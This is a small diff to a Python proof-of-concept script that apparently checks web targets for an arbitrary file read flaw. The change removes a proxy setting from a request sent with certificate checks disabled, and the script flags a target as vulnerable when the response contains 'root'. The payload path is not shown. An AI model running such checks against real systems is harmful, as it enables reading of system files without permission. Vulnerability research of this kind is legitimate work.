@@ -68,7 +68,7 @@ def poc(target):
     }
 
     try:
-        res = requests.get(url=url, headers=headers, verify=False, timeout=10, proxies=proxies)
+        res = requests.get(url=url, headers=headers, verify=False, timeout=10)
 
         if res.status_code == 200 and "root" in res.text:
             logging.info(f"{GREEN}[+] 该网站存在任意文件读取漏洞，url为 {target}{RESET}")
